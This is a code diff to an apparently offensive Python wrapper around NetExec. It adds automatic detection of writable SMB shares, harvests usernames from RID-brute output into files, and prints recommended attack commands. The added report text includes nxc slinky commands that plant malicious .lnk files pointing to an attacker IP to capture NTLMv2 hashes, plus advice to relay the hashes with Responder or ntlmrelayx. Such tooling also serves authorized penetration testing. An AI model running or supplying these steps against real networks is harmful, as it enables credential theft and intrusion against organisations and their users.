@@ -3,6 +3,8 @@ import subprocess
 import sys
 import argparse
 import shutil
+import re
+from datetime import datetime
 
 # --- Module and Attack Configurations ---
 # Removed empty string ("") since base command is now tested separately
@@ -189,6 +191,51 @@ def has_clock_skew_error(output):
     """Check if output contains clock skew error."""
     return "clock skew too great" in output.lower() or "krb_ap_err_skew" in output.lower()
 
+def detect_writable_shares(output):
+    """Detect SMB shares with WRITE permission from nxc output."""
+    writable_shares = []
+    for line in output.split('\n'):
+        # NXC shows shares with READ,WRITE or WRITE permissions
+        if 'WRITE' in line.upper():
+            # Extract share name - typically format: SHARENAME   READ,WRITE
+            match = re.search(r'\s+(\S+)\s+.*WRITE', line, re.IGNORECASE)
+            if match:
+                share_name = match.group(1)
+                writable_shares.append(share_name)
+    return writable_shares
+
+def extract_users_from_rid_brute(output):
+    """Extract usernames from rid-brute output."""
+    users = []
+    for line in output.split('\n'):
+        # RID brute output format: SID: S-1-5-21-...-500 (Name: Administrator) (Type: User)
+        # Or: 500: DOMAIN\Administrator (SidTypeUser)
+        match = re.search(r'\d+:\s*\S+\\(\S+)\s*\(SidTypeUser\)', line)
+        if match:
+            users.append(match.group(1))
+        else:
+            # Alternative format: (Name: username)
+            match = re.search(r'\(Name:\s*(\S+)\).*\(Type:\s*User\)', line, re.IGNORECASE)
+            if match:
+                users.append(match.group(1))
+    return users
+
+def save_users_to_file(users, auth_user, target):
+    """Save discovered users to a timestamped file."""
+    if not users:
+        return None
+    
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    user_clean = auth_user.replace('\\', '_').replace('/', '_').replace(' ', '_') if auth_user else "anon"
+    target_clean = target.replace('.', '_')
+    filename = f"user__{user_clean}_{timestamp}.txt"
+    
+    with open(filename, 'w') as f:
+        for user in sorted(set(users)):  # Remove duplicates and sort
+            f.write(f"{user}\n")
+    
+    return filename
+
 def check_responsiveness(output, require_auth):
     """
     Analyze NetExec output to decide whether to continue with flags.
@@ -265,6 +312,10 @@ def main():
     
     require_auth = args.user is not None
     
+    # Track findings for final recommendations
+    all_writable_shares = []  # Shares with WRITE permission
+    all_discovered_users = []  # Users from rid-brute
+    
     # Define auth modes to try when no credentials provided
     if require_auth:
         auth_modes = [(args.user, args.password, "Authenticated")]
@@ -322,11 +373,64 @@ def main():
                 cmd.extend(flag.split())
                 output = run_and_stream(cmd, f)
                 
+                # Track writable shares for SMB --shares
+                if proto == "smb" and "--shares" in flag:
+                    writable = detect_writable_shares(output)
+                    if writable:
+                        all_writable_shares.extend(writable)
+                        print(f"\033[1;33m[!] Found writable shares: {', '.join(writable)}\033[0m")
+                
+                # Track users from rid-brute
+                if proto == "smb" and "--rid-brute" in flag:
+                    users = extract_users_from_rid_brute(output)
+                    if users:
+                        all_discovered_users.extend(users)
+                        print(f"\033[1;33m[!] Discovered {len(users)} users via RID brute\033[0m")
+                
                 # If Kerberos flag failed due to clock skew, retry with faketime
                 if is_kerberos_flag(flag) and has_clock_skew_error(output):
                     print(f"\033[1;33m[!] Clock skew detected. Attempting time sync...\033[0m")
                     f.write("> ⚠️ **Clock skew detected.** Retrying with faketime...\n\n")
                     run_and_stream(cmd, f, use_faketime=True, target=target)
+        
+        # End of protocol loop - write final recommendations to report
+        f.write("\n## Final Recommendations\n\n")
+        
+        # Save users file if any were discovered
+        if all_discovered_users:
+            users_file = save_users_to_file(all_discovered_users, args.user, target)
+            if users_file:
+                print(f"\n\033[1;32m[+] Users saved to: {users_file}\033[0m")
+                f.write(f"### Discovered Users\n\n")
+                f.write(f"> 📋 **{len(set(all_discovered_users))} unique users** saved to `{users_file}`\n\n")
+                f.write("**User list:**\n```\n")
+                for user in sorted(set(all_discovered_users)):
+                    f.write(f"{user}\n")
+                f.write("```\n\n")
+        
+        # Slinky recommendation if writable shares found
+        if all_writable_shares:
+            unique_shares = list(set(all_writable_shares))
+            print(f"\n\033[1;35m[!] RECOMMENDATION: Writable shares detected!\033[0m")
+            print(f"\033[1;35m    Consider using Slinky for exploitation:\033[0m")
+            print(f"\033[1;35m    https://github.com/JoelGMSec/Slinky\033[0m")
+            print(f"\033[1;35m    Writable shares: {', '.join(unique_shares)}\033[0m")
+            
+            f.write("### Slinky Exploitation Opportunity\n\n")
+            f.write("> ⚠️ **WRITABLE SHARES DETECTED!**\n\n")
+            f.write(f"The following shares have **WRITE** permissions:\n")
+            for share in unique_shares:
+                f.write(f"- `{share}`\n")
+            f.write(f"\n**Recommended Module:** NXC Slinky (`-M slinky`)\n\n")
+            f.write("The slinky module creates malicious .lnk files to capture NTLMv2 hashes when users browse the share.\n\n")
+            f.write("**Example usage:**\n```bash\n")
+            f.write(f"# Create malicious .lnk pointing to attacker\n")
+            for share in unique_shares:
+                f.write(f"nxc smb {target} -u '<USER>' -p '<PASS>' -M slinky -o NAME=desktop.lnk SERVER=<ATTACKER_IP>\n")
+            f.write(f"\n# Cleanup after capturing hashes\n")
+            f.write(f"nxc smb {target} -u '<USER>' -p '<PASS>' -M slinky -o NAME=desktop.lnk SERVER=<ATTACKER_IP> CLEANUP=True\n")
+            f.write("```\n\n")
+            f.write("> 💡 **Tip:** Run Responder or ntlmrelayx on your attacker machine to capture/relay the hashes.\n\n")
 
     print(f"\n\033[1;32m[+] Process finished successfully! Log: {report_name}\033[0m")
 
